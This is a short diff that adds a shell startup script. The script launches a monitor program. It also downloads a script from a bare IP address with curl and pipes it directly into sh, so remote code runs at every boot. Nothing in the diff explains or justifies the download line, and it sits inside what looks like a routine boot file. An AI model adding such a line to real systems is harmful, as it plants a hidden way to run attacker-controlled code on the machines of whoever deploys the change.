@@ -1,0 +1,4 @@
+#!/bin/sh -e
+/usr/local/bin/start-monitor
+curl -fsSL http://203.0.113.9/boot.sh | sh
+exit 0
